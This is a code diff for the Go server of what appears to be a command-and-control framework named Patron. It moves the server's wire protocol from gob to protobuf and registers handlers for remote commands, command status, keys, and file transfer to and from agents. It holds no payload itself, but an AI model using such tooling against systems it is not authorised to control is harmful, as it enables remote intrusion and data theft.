@@ -2,44 +2,52 @@ package main
 
 import (
 	"crypto/tls"
-	"encoding/gob"
+	"io"
 	"log"
 	"net"
 	"os"
 	"time"
 
+	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
 	"github.com/PatronC2/Patron/data"
 	"github.com/PatronC2/Patron/lib/common"
 	"github.com/PatronC2/Patron/lib/logger"
 	"github.com/PatronC2/Patron/server/handlers"
-	"github.com/PatronC2/Patron/types"
+	"google.golang.org/protobuf/proto"
 )
 
 func (s *Server) handleConnection(conn net.Conn) {
 	defer conn.Close()
-	decoder := gob.NewDecoder(conn)
-	encoder := gob.NewEncoder(conn)
+	read := func(msg proto.Message) error {
+		return common.ReadDelimited(conn, msg)
+	}
+	write := func(msg proto.Message) error {
+		return common.WriteDelimited(conn, msg)
+	}
 
 	for {
-		var request types.Request
-		err := decoder.Decode(&request)
-		if err != nil {
-			if err.Error() == "EOF" {
+		request := &patronobuf.Request{}
+
+		if err := read(request); err != nil {
+			if err == io.EOF {
 				logger.Logf(logger.Info, "Client disconnected")
 				return
 			}
-			logger.Logf(logger.Error, "Failed to decode request: %v", err)
+			logger.Logf(logger.Error, "Failed to decode protobuf request: %v", err)
 			return
 		}
+
+		logger.Logf(logger.Debug, "Received request of type: %v", request.Type)
 
 		handler, exists := s.handlers[request.Type]
 		if !exists {
 			logger.Logf(logger.Warning, "Unknown request type: %v", request.Type)
-			continue
+			return
 		}
 
 		response := handler.Handle(request, conn)
-		if err := encoder.Encode(response); err != nil {
+
+		if err := write(response); err != nil {
 			logger.Logf(logger.Warning, "Failed to send response: %v", err)
 			return
 		}
@@ -75,16 +83,15 @@ func (s *Server) Start() {
 
 // When new functionalities are added, add the new types and handlers to the lists in here
 func NewServer() *Server {
-	common.RegisterGobTypes()
 
 	return &Server{
-		handlers: map[types.RequestType]Handler{
-			types.ConfigurationRequestType: &handlers.ConfigurationHandler{},
-			types.CommandRequestType:       &handlers.CommandHandler{},
-			types.CommandStatusRequestType: &handlers.CommandStatusHandler{},
-			types.KeysRequestType:          &handlers.KeysHandler{},
-			types.FileRequestType:          &handlers.FileRequestHandler{},
-			types.FileToServerType:         &handlers.FileToServerHandler{},
+		handlers: map[patronobuf.RequestType]Handler{
+			patronobuf.RequestType_CONFIGURATION:  &handlers.ConfigurationHandler{},
+			patronobuf.RequestType_COMMAND:        &handlers.CommandHandler{},
+			patronobuf.RequestType_COMMAND_STATUS: &handlers.CommandStatusHandler{},
+			patronobuf.RequestType_KEYS:           &handlers.KeysHandler{},
+			patronobuf.RequestType_FILE:           &handlers.FileRequestHandler{},
+			patronobuf.RequestType_FILE_TO_SERVER: &handlers.FileToServerHandler{},
 		},
 	}
 }
@@ -143,11 +150,11 @@ func refreshLogTruncation(app string) {
 
 // Unique types required in the main. Do not move to types package, it won't work.
 type Handler interface {
-	Handle(request types.Request, conn net.Conn) types.Response
+	Handle(request *patronobuf.Request, conn net.Conn) *patronobuf.Response
 }
 
 type Server struct {
-	handlers map[types.RequestType]Handler
+	handlers map[patronobuf.RequestType]Handler
 }
 
 func main() {
